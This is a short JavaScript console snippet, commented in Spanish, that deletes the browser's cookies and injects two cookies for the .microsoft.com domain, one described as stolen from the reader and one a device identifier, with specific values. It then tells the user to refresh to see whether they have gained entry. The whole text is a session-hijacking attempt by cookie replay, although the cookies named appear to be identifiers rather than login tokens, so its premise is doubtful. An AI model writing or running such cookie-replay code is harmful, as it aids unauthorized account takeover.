// Borramos cualquier cookie previa para la prueba
document.cookie.split(";").forEach(function(c) { document.cookie = c.replace(/^ +/, "").replace(/=.*/, "=;expires=" + new Date().toUTCString() + ";path=/"); });

// Intentamos inyectar la cookie ANON que te robaron
document.cookie = "ANON=A=B2E425B8BF987335915580A8FFFFFFFF&E=1f57&W=1; domain=.microsoft.com; path=/; SameSite=None; Secure";

// Intentamos inyectar la cookie MSFPC (identificador de dispositivo)
document.cookie = "MSFPC=GUID=a8dead656ccb429cbbbe31c48d46972b&HASH=a8de&LV=202506&V=4&LU=1750551901434; domain=.microsoft.com; path=/; Secure";

console.log("Cookies inyectadas. Ahora refresca la página (F5) para ver si lograste entrar.");
